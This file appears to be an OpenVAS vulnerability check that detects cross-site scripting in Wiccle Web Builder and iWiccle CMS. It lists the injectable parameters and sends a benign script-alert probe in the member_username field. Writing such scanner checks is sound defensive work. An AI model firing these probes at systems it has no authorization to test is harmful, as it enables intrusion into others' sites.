###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wiccle_multiple_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Wiccle Web Builder CMS and iWiccle CMS Community Builder Multiple XSS Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "Upgrade to Wiccle Web Builder CMS version 1.1.0 or later,
  For updates refer to http://www.wiccle.com/page/download_wiccle

  Upgrade to iWiccle CMS Community Builder version 1.3.0 or later,
  For updates refer to http://www.wiccle.com/page/download_iwiccle";

tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  application/site.
  Impact Level: Application";
tag_affected = "Wiccle Web Builder CMS version 1.0.1 and prior.
  iWiccle CMS Community Builder version 1.2.1.1 and prior.";
tag_insight = "The flaws are caused by improper validation of user-supplied input passed via
  the 'member_city', 'post_name', 'post_text', 'post_tag', 'post_member_name',
  'member_username' and  'member_tags' parameters to 'index.php', that allows
  attackers to execute arbitrary HTML and script code on the web server.";
tag_summary = "The host is running Wiccle Web Builder or iWiccle CMS Community
  Builder and is prone to multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(802228);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_bugtraq_id(44295);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Wiccle Web Builder CMS and iWiccle CMS Community Builder Multiple XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=130");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/62726");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_Wiccle_Web_Builder_and_iWiccle_CMS_Community_Builder.txt");
  script_xref(name : "URL" , value : "http://www.wiccle.com/news/backstage_news/iwiccle/post/iwiccle_cms_community_builder_130_releas");

  script_description(desc);
  script_summary("Check if Wiccle CMS is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "solution" , value : tag_solution);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Chek Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list("/wwb", "/iwiccle", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php?module=site&show=home"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if(">Powered by Wiccle<" >< res)
  {
    ## Construct the Attack Request
    url = string(dir, "/index.php?module=members&show=member_search&member_",
                            "username=<script>alert('XSS-Test')<%2Fscript>");

    ## Try attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:port, url:url,
       pattern:"><script>alert\('XSS-Test'\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
